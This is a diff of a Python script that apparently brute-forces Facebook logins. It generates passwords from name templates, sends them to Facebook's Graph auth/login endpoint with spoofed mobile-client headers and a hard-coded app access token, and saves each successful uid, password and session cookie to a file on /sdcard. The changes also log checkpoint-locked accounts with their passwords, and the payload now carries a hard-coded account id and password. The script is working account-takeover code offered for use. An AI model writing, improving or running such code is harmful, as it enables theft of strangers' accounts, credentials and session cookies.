@@ -1171,51 +1171,53 @@ def graph(uid, name, pwx, tl):
             pw = ps.replace("first", first).replace("last", last).lower()
             ua_string = ua()
             data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'Device_id': str(uuid.uuid4()),
-                'email': uid,
-                'password': pw,
-                'generate_analytics_claims': '1',
-                'community_id': '',
-                'cpl': 'true',
-                'try_num': '1',
-                'family_Device_id': str(uuid.uuid4()),
-                'credentials_type': 'password',
-                'source': 'login',
-                'error_detail_type': 'button_with_disabled',
-                'enroll_misauth': 'false',
-                'generate_Session_cookies': '1',
-                'generate_machine_id': '1',
-                'currently_logged_in_userid': '0',
-                'locale': 'en_GB',
-                'client_country_code': 'GB',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            }
+            'email': '100063275105133',
+            'password': '834819',
+            'adid': str(uuid.uuid4()),
+            'device_id': str(uuid.uuid4()),
+            'family_device_id': str(uuid.uuid4()),
+            'session_id': str(uuid.uuid4()),
+            'advertiser_id': str(uuid.uuid4()),
+            'reg_instance': str(uuid.uuid4()),
+            'logged_out_id': str(uuid.uuid4()),
+            'locale': 'en_US',
+            'client_country_code': 'US',
+            'cpl': 'true',
+            'source': 'login',
+            'format': 'json',
+            'omit_response_on_success': 'false',
+            'credentials_type': 'password',
+            'error_detail_type': 'button_with_disabled',
+            'generate_session_cookies': '1',
+            'generate_analytics_claim': '1',
+            'generate_machine_id': '1',
+            'tier': 'regular',
+            'currently_logged_in_userid': '0',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+            'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
+            'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'api_key': '882a8490361da98702bf97a021ddc14d',
+            'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
             headers = {
-                'User-Agent': ua(),
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'close',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': str(random.randint(20000,40000)),
-                'X-FB-SIM-HNI': str(random.randint(20000,40000)),
-                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'X-FB-Connection-Type': 'WIFI',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-Session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'X-FB-Device-group': str(random.randint(2000, 4000)),
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
-            }
-            url = "https://b-graph.facebook.com/auth/login"
+            'Host': 'graph.facebook.com',
+            'User-Agent': UA(),
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
+            'X-FB-Net-HNI': str(random.randint(20000,40000)),
+            'X-FB-Connection-Bandwidth': '27181576',
+            'X-FB-Connection-Quality': 'EXCELLENT',
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Friendly-Name': 'authenticate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': '1026'}
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "Session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
@@ -1336,7 +1338,7 @@ def p(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write(f"\r {green}(M2) ({loop}) (OK-{len(oks)}) \r"),
+    sys.stdout.write(f"\r {green}(M2) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1415,6 +1417,11 @@ def p(uid,pwx,tl):
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
+            elif "www.facebook.com" in result["error"]["message"]:
+                print(f" {red}[SUMON-CP] {uid}|{pw}")
+                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+                cps.append(uid+"|"+pw)
+                break
             else:
                 continue
         loop+=1
